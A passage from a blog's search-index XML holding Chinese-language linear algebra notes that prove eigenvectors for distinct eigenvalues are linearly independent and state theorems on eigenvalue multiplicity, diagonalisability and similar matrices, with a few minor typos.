class="math inline">\(x_1p_1+x_2p_2+\cdots+x_mp_m=0\)</span></p>
<p>则 <span
class="math inline">\(A(x_1p_1+x_2p_2+\cdots+x_mp_m)=0\)</span> ，即</p>
<p><span
class="math inline">\(x_1Ap_1+x_2Ap_2+\cdots+x_mAp_m=0\)</span></p>
<p><span class="math inline">\(x_1\lambda_1
p_1+x_2\lambda_2p_2+\cdots+x_m\lambda_mp_m=0\)</span></p>
<p>类推之，有</p>
<p><span
class="math inline">\(\lambda_1^kx_1p_1+\lambda_2^kx_2p_2+\cdots+\lambda_m^kx_mp_m=0(k=1,2,\cdots,m-1)\)</span></p>
<p>把以上各式写成矩阵形式，得： <span class="math display">\[
\begin{matrix}\left(x_1p_1,x_2p_2,\cdots,x_mp_m\right)\end{matrix}
\left[
\begin{matrix}
1 &amp;\lambda_1 &amp;\cdots &amp;\lambda_1^{m-1}\\
1 &amp;\lambda_2 &amp;\cdots &amp;\lambda_2^{m-1}\\
\vdots &amp;\vdots &amp; &amp;\vdots\\
1 &amp;\lambda_m &amp;\cdots &amp;\lambda_m^{m-1}
\end{matrix}
\right]
=(0,0,\cdots,0)
\]</span>
上式等号左端第二个矩阵的行列式为范德蒙行列式，当λ<sub>i</sub>各不相等时该行列式不等于0，从而该矩阵可逆，于是有</p>
<p><span
class="math inline">\((x_1p_1,x_2p_2,\cdots,x_mp_m)=(0,0,\cdots,0)\)</span></p>
<p>即 <span class="math inline">\(x_jp_j=0(j=1,2,\cdots,m)\)</span></p>
<p>但 <span class="math inline">\(p_j\neq 0\)</span> ,故 <span
class="math inline">\(x_j=0(j=1,2,\cdots,m)\)</span> 所以向量组 <span
class="math inline">\(p_1,p_2,\cdots,p_m\)</span> 线性无关</p>
</blockquote>
<p>还可用数学归纳法证明</p>
<blockquote>
<p>证明：当k=1时，定理显然成立.</p>
<p>假设k=m时定理成立，当k=m+1时，设 <span class="math display">\[
a_1p_1+a_2p_2+\cdots+a_{m+1}p_{m+1}=0 \tag{1}
\]</span> 则 <span class="math display">\[
\begin{split}
&amp;A(a_1p_1+a_2p_2+\cdots+a_{m+1}p_{m+1}=0)\\
&amp;a_1Ap_1+a_2Ap_2+\cdots+a_{m+1}Ap_{m+1}=0\\
\end{split}
\]</span></p>
<p><span class="math display">\[
a_1\lambda_1p_1+a_2\lambda_2p_2+\cdots+a_{m+1}\lambda_{m+1}p_{m+1}=0\tag{2}
\]</span></p>
<p>将式(1)两边乘以λ<sub>m+1</sub>，再与式(2)相减得： <span
class="math display">\[
a_1(\lambda_{m+1}-\lambda_1)p_1+a_2(\lambda_{m+1}-\lambda_2)p_2
+\cdots+a_m(\lambda_{m+1}-\lambda_m)p_m=0
\]</span> 由假设归纳可得：<span
class="math inline">\(p_1,p_2,\cdots,p_m\)</span> 线性无关，所以 <span
class="math display">\[
a_1(\lambda_{m+1}-\lambda_1)p_1=0,a_2(\lambda_{m+1}-\lambda_2)p_2
=0,\cdots,a_m(\lambda_{m+1}-\lambda_m)p_m=0
\]</span> 因为 <span
class="math inline">\(\lambda_{m+1}-\lambda_i\neq0,i=1,2,\cdots,m\)</span>，
所以 <span class="math inline">\(a_1=a_2=\cdots=a_m=0\)</span>
代入式(1)得</p>
<p><span class="math inline">\(a_{m+1}p_{m+1}=0\)</span> 因为 <span
class="math inline">\(p_{m+1}\neq0\)</span> ，故a<sub>m+1</sub>=0
,这表明 <span class="math inline">\(p_1,p_2,\cdots,p_{m+1}\)</span>
线性无关,定理得证</p>
</blockquote>
<h3 id="推论2-1">推论2</h3>
<p>如果n阶方阵<strong>A</strong>有n个两两不同得特征值，则<strong>A</strong>可对角化</p>
<h3 id="推论3">推论3</h3>
<p>设 <span
class="math inline">\(\lambda_1,\lambda_2,\cdots,\lambda_m\)</span>是方阵<strong>A</strong>的两两不同特征值，<span
class="math inline">\(p_{i1},p_{i2},\cdots,p_{ir_i}\)</span>
是<strong>A</strong>的属于λ<sub>i</sub>的线性无关的特征向量 <span
class="math inline">\((1\leq i\leq m)\)</span> ,则</p>
<p><span
class="math inline">\(p_{11},p_{12},\cdots,p_{1r_1},p_{21},\cdots,p_{2r_2},\cdots,p_{m1},p_{m2},\cdots,p_{mr_m}\)</span></p>
<p>共 <span class="math inline">\((r_1+r_2+\cdots+r_m个向量)\)</span>
仍线性无关</p>
<p>即若选取λ<sub>i</sub>对应<strong>A</strong>的特征向量内部线性无关，那么多个λ对应<strong>A</strong>的特征向量仍线性无关</p>
<p>将属于不同特征值的线性无关的特征向量合并在一起，可以组成个数更多的线性无关的特征向量组</p>
<h2 id="定理3">定理3</h2>
<p>设λ<sub>0</sub>是n阶方阵<strong>A</strong>的重数为k的特征值，对应于λ<sub>0</sub>，<strong>A</strong>最多有m个线性无关的特征向量，则
<span class="math inline">\(m\leq k\)</span></p>
<p>例：λ<sub>1</sub>=2,λ<sub>2</sub>=3,k=1，最多有1个线性无关的特征向量</p>
<p>λ<sub>1</sub>=λ<sub>2</sub>=2,k=2,最多有2个线性无关的特征向量</p>
<p>对于n阶方阵<strong>A</strong>，最多能有n个线性无关的特征向量&lt;——<strong>A</strong>最多能有重数为n的特征值</p>
<h2 id="定理4">定理4</h2>
<p>方阵<strong>A</strong>可对角化的充分必要条件是对应于<strong>A</strong>的任意特征值λ，<strong>A</strong>有k个线性无关的特征向量，其中k是λ作为特征值的重数</p>
<p>线性无关的特征向量个数=齐次线性方程组(λ<strong>E</strong>-<strong>A</strong>)<strong>x</strong>=<strong>0</strong>基础解析的向量个数</p>
<p><strong>对于单特征值，必有属于它的特征向量</strong></p>
<h3 id="推论4">推论4</h3>
<p>如果n阶方阵<strong>A</strong>的n个特征值个不相等，则<strong>A</strong>与对角矩阵相似，（也称<strong>A</strong>可对角化）</p>
<h2 id="定理5">定理5</h2>
<p>若n阶方阵<strong>A</strong>与<strong>B</strong>相似，则<strong>A</strong>与<strong>B</strong>的特征多项式相同，从而<strong>A</strong>与<strong>B</strong>的特征值亦相同</p>
<h3 id="推论5">推论5</h3>
<p>若n阶方阵A与对角阵 <span class="math display">\[
A=
\left[
\begin{matrix}
\lambda_1 &amp; &amp; &amp; \\
&amp; &amp;\lambda_2 &amp; &amp; \\
&amp; &amp; &amp;\ddots &amp; \\
&amp; &amp; &amp; &amp;\lambda_n
\end{matrix}
\right]
\]</span> 相似，则 <span
class="math inline">\(\lambda_!,\lambda_2,\cdots,\lambda_n\)</span>
就是A的n个特征值</p>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>Linear Algebra</tag>
        <tag>vector</tag>
      </tags>
  </entry>
</search>
